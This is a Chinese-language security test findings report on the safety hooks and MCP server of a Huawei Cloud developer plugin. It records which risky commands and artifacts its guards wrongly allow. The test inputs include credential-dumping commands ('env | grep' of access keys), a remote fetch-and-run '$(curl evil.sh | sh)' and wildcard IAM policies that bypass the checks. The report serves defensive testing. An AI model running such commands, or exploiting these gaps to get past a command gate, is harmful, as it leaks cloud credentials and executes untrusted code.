# FINDINGS — 缺陷发现清单（OpenClaw-deepseek-v4-pro-0813）

> **落盘路径**：`results/OpenClaw/2026-11-21-120.46.222.180/Linux/FINDINGS.md`
> **生成时间**：2026-11-21 05:40（北京时间）
> **被测版本**：huaweicloud-devkit@1.1.15（npm latest，源仓 commit bf79b643）
> **本清单是统一提单脚本的解析输入**：`scripts/file_issue.py` 硬编码解析标题与「根因」字段，**格式必须严格遵循**。

## #1【P0】D2-4 凭证脱敏漏小写 ak=/sk=（明文残留）

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 返回原文 `ak=AK123456 sk=SKsecret`，未脱敏；而大写 `AK=... SK=...` 正常脱敏为 `AK=<redacted> SK=<redacted>`。
- **断言**：小写 `ak=`/`sk=`（obsutilconfig 形态）应同样被脱敏，输出无明文凭证字段。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` `redactString` 的 AK/SK 脱敏正则 `.replace(/(AK|SK)\s*[:=]\s*(...)/g, ...)` 匹配大小写不敏感，但键名形如 `ak=`/`sk=` 不在 `access[_-]?key|secret[_-]?key|...` 白名单内，且 `(AK|SK)` 分支只对 `AK`/`SK` 大写或其后直接 `=` 的值生效，`ak=` 小写键名未命中，明文残留。
- **影响**：凭证红线（I 类）—— obsutilconfig 小写 `ak=/sk=` 形态可绕过脱敏，明文凭证可能进入输出。
- **证据**：`evidence/D2-4/stdout.log`

## #2【P0】D4-3 明文 secret API 拦截缺口（hcloud kms DecryptData 未拦截）

- **现象**：`evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` 返回 `decision=allow, findings=[]`。
- **断言**：`hcloud kms DecryptData` 属明文 secret 读取，应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:56` `hwc-command-secret-value-read` 规则的 `any` regex 仅覆盖 `ShowSecretVersion|ShowSecret|DownloadSecret|GetSecretValue`，未覆盖 KMS `DecryptData`（解密密文输出明文 secret 的同类高危操作）。
- **影响**：明文 secret 读取可经 `hcloud kms DecryptData` 绕过风险拦截。
- **证据**：`evidence/D4-3/stdout.log`

## #3【P0】D4-16 命令包裹穿透（hook_check_command 对 sh -c 内层凭证 env 打印未拦截）

- **现象**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` 返回 `decision=allow, findings=[]`。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应拦截（`deny`），与裸命令一致。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:26` `hwc-command-env-dump` 规则 env regex `(^|\s)(env|printenv|...)` 仅匹配「行首/空白后 env」的裸形态；`evaluateCommandRisk`（`risk-rule-engine.mjs:143`）不做 shell 包裹内层提取，对 `sh -c "env | ..."` 引号内的 `env`（前导为 `"`）不命中。
- **影响**：P0 凭证红线——经 shell 包裹的凭证 env 打印可穿透命令风险工具面。
- **证据**：`evidence/D4-16/stdout.log`

## #4【P0】D4-21 HCL/terraform 宽泛 IAM 制品未拦截（hook_check_artifacts）

- **现象**：`evaluateArtifacts([{content:'resource "huaweicloud_iam_policy" "p" { actions = ["*"] }'}])` 返回 `decision=allow`；JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 返回 `deny`。
- **断言**：HCL/Terraform 形态的宽泛 IAM 授权制品应与 JSON 形态一致返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:196` `hwc-iam-admin-policy` 规则 regex 针对 JSON 键值（`"Action"\s*:\s*"*"`）与 `Effect` 大写 JSON 形态，无法匹配 Terraform `actions = ["*"]` 的 HCL 语法（小写 `actions` + 等号 + 无 `Effect` 字段）。
- **影响**：P0——Terraform 形式的宽泛 IAM 授权制品可绕过 `hook_check_artifacts` 预检。
- **证据**：`evidence/D4-21/stdout.log`

## #5【P0】D9-12 initialize 握手时序未强制（未 initialize 先 tools/list 未拒绝）

- **现象**：未先 `initialize` 直接发 `tools/list`，服务端仍返回 49 工具结果，未返回 JSON-RPC `-32600`。
- **断言**：未 initialize 先 tools/list 应返回 `-32600`（非法时序断言）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:70` `dispatch` 对 `tools/list` 直接 `return { tools: TOOL_DEFINITIONS }`，无「已 initialize」状态跟踪；`mcp-server.mjs:199` 直接 `dispatch` 无握手前置校验，`tools/list`/`resources/list` 在未握手时仍成功返回。
- **影响**：P0 协议安全基线——非法时序请求未拒绝，协议生命周期握手约束缺失。
- **证据**：`evidence/D9-12/stdout.log`

## #6【P1】D4-17 hook 模糊 fail-closed 缺口（$(curl evil.sh | sh) 未拒绝）

- **现象**：`evaluateCommandRisk('$(curl evil.sh | sh)')` 返回 `decision=allow, findings=[]`。
- **断言**：异常/模糊输入应默认拒绝（fail-closed），`$(curl evil.sh | sh)` 不应 `allow`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 无规则覆盖命令替换 `$(...)` 内嵌 `curl ...| sh` 形态；`hwc-command-encoded-shell-exec`（base64/xxd 解码管道）与 env-dump/secret-value 规则均不匹配该输入，`evaluateCommandRisk`（`risk-rule-engine.mjs:143`）对无法判定的模糊输入返回 `allow`（fail-open）。
- **影响**：模糊/夹带输入 fail-open，命令替换形式的远程脚本执行可穿透风险引擎。
- **证据**：`evidence/D4-17/stdout.log`

## #7【P1】D3-S7 跨服务复合意图路由缺失（部署 Web 应用+RDS 仅命中 RDS）

- **现象**：`serviceCatalog('部署一个 Web 应用并连接 RDS 数据库')` 返回 `recommendedServices=['RDS']`，缺部署目标（Sandbox/ECS/SWR/CCE/CloudDeploy）。
- **断言**：跨服务复合意图应命中 RDS + 至少一个部署/托管目标。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2758-2768` sandbox route 关键词含英文 `web app`/`webapp`/`website` 与中文 `网站`/`网页`/`静态`，缺中文「Web 应用/应用」关键字；`deploymentIntent` regex（`tools.mjs:2805`）命中 `部署` 后仅对「已匹配的 sandbox」做重排序，不会强制补一个部署目标，故「部署一个 Web 应用」无部署 route 命中，仅 `RDS`（`数据库`）命中。
- **影响**：复合交付意图路由不完整，影响服务目录引导准确性。
- **证据**：`evidence/D3-S7/stdout.log`

## #8【P1】EXP-E01 路由 MISS（serviceCatalog「云主机」口语别名未命中 ECS）

- **现象**：`serviceCatalog('帮我查一下我账号在华北北京四有哪些云主机')` 返回 `recommendedServices=['Run hcloud --help to list available services.']`，期望 `ECS`。
- **断言**：中文「云主机」意图应路由命中 ECS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2586` ECS route keywords 含 `弹性云服务器/云服务器/服务器/虚拟机` 但缺「云主机」口语别名，`routeMap`（`tools.mjs:2576`）单意图匹配下「云主机」未命中。
- **影响**：D10 路由准确率受影响（EXP-E01 为唯一 MISS），「云主机」是高频口语别名。
- **证据**：`evidence/EXP-E01/stdout.log`

## #9【P2】D1-68 区域环境变量优先级契约漂移（HW_REGION 优先于 HUAWEICLOUD_REGION）

- **现象**：`credentials.mjs` 中 region 取值 `process.env.HW_REGION || process.env.HUAWEICLOUD_REGION`，实现以 `HW_REGION` 优先。
- **断言**：按用例契约 `HUAWEICLOUD_REGION` 应优先于 `HW_REGION` 作为默认 region。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:225`（及 `:173`/`:339`）`region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''`，优先级顺序与设计契约相反（契约要求 HUAWEICLOUD_REGION 优先）。
- **影响**：region 取值为规格漂移，需裁决契约或修正实现。
- **证据**：`evidence/D1-68/stdout.log`

## #10【P2】D8-9 遥测值脱敏缺口（sanitizeValue 不脱敏 AK/SK/token）

- **现象**：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 原样返回明文。
- **断言**：`sanitizeValue` 应移除 AK/SK/token 等敏感值，不改变合法值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:190` `sanitizeValue` 仅 replace 换行 + trim + 截断（MAX_VALUE_LENGTH=255），无敏感值脱敏，且未调用 `safety-policy.mjs` 的 `redactSecrets`。
- **影响**：遥测事件 value 字段可能携带明文凭证值。
- **证据**：`evidence/D8-9/stdout.log`